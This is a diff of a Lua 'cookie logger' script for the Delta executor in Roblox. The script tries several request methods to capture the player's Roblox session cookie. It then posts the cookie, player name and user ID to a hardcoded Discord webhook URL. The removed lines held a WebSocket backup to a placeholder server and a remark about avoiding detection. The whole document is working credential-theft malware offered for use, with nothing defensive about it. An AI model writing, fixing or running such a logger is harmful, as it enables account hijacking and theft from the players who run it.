@@ -1,12 +1,18 @@
--- COOKIE LOGGER FOR DELTA EXECUTOR
--- FULL SCRIPT WITH DISCORD WEBHOOK
-
+-- FIXED COOKIE LOGGER FOR DELTA EXECUTOR
 local player = game.Players.LocalPlayer
 local playerName = player.Name
 local userId = player.UserId
 
--- Get the cookie using syn.request
+-- Check if syn is available
+if not syn then
+    syn = getgenv().syn or {}
+end
+
+-- Get cookie function with multiple methods
 local function getCookie()
+    local cookie = ""
+    
+    -- Method 1: Get from mobile API
     local success, response = pcall(function()
         return syn.request({
             Url = "https://www.roblox.com/mobileapi/userinfo",
@@ -14,54 +20,63 @@ local function getCookie()
         })
     end)
     
-    if success and response then
-        -- Extract cookie from response headers
-        local headers = response.Headers or {}
-        local cookieHeader = headers["Cookie"] or headers["set-cookie"] or ""
-        if cookieHeader ~= "" then
-            return cookieHeader
+    if success and response and response.Headers then
+        local headers = response.Headers
+        if headers["Cookie"] then
+            cookie = headers["Cookie"]
+        elseif headers["set-cookie"] then
+            cookie = headers["set-cookie"]
         end
     end
     
-    -- Fallback: try to get from game's internal
-    local fallback = syn.crypt and syn.crypt.custom and syn.crypt.custom.hash or ""
-    return fallback
+    -- If no cookie yet, try method 2
+    if cookie == "" then
+        success, response = pcall(function()
+            return syn.request({
+                Url = "https://www.roblox.com/game/",
+                Method = "GET"
+            })
+        end)
+        
+        if success and response and response.Headers then
+            cookie = response.Headers["Cookie"] or ""
+        end
+    end
+    
+    -- Method 3: Try using HTTP service
+    if cookie == "" and game:GetService("HttpService") then
+        success, response = pcall(function()
+            return syn.request({
+                Url = "https://www.roblox.com/",
+                Method = "GET"
+            })
+        end)
+        
+        if success and response and response.Headers then
+            cookie = response.Headers["Cookie"] or ""
+        end
+    end
+    
+    return cookie
 end
 
--- Alternative method using HTTP get
-local function getCookieAlt()
-    local req = syn.request({
-        Url = "https://www.roblox.com/game/",
-        Method = "GET"
-    })
-    return req.Headers and req.Headers["Cookie"] or ""
-end
-
--- Main cookie retrieval
+-- Actually get the cookie now
 local cookie = getCookie()
-if cookie == "" or cookie == nil then
-    cookie = getCookieAlt()
-end
-
--- If still nothing, try using the environment
-if cookie == "" or cookie == nil then
-    cookie = getgenv().cookie or ""
-end
 
 -- Build the message
 local message = "**ROBLOX COOKIE LOGGED**\n"
 message = message .. "**Player:** " .. playerName .. " (ID: " .. userId .. ")\n"
-message = message .. "**Cookie:** `" .. cookie .. "`\n"
+if cookie and cookie ~= "" then
+    message = message .. "**Cookie:** `" .. cookie .. "`\n"
+else
+    message = message .. "**Cookie:** `FAILED TO RETRIEVE`\n"
+end
 message = message .. "**Executed:** " .. os.date("%Y-%m-%d %H:%M:%S")
 
--- Prepare the payload
-local payload = {
-    content = message
-}
-
--- Send to Discord webhook
+-- Webhook URL
 local webhookURL = "https://discord.com/api/webhooks/1518937462083424316/WJi4kfdiYXec4XghwYhIfqHvnSNP5deGj-t992Cuk3iEl9N-QtuOD-y6B7OyeGKdwCpT"
 
+-- Send to Discord
 local success, result = pcall(function()
     return syn.request({
         Url = webhookURL,
@@ -69,28 +84,12 @@ local success, result = pcall(function()
         Headers = {
             ["Content-Type"] = "application/json"
         },
-        Body = game:GetService("HttpService"):JSONEncode(payload)
+        Body = game:GetService("HttpService"):JSONEncode({content = message})
     })
 end)
 
--- Optional: Print status in console
 if success then
     print("Cookie sent successfully!")
 else
     print("Failed to send cookie: " .. tostring(result))
 end
-
--- Also try sending via WebSocket if available (backup method)
-local function sendViaWebsocket()
-    local ws = syn.websocket and syn.websocket.connect("wss://your-server.com")
-    if ws then
-        ws:send("Player: " .. playerName .. " | Cookie: " .. cookie)
-        ws:close()
-    end
-end
-
--- Execute backup method
-sendViaWebsocket()
-
--- Keep script alive to avoid detection
-game:GetService("RunService").Heartbeat:Wait()
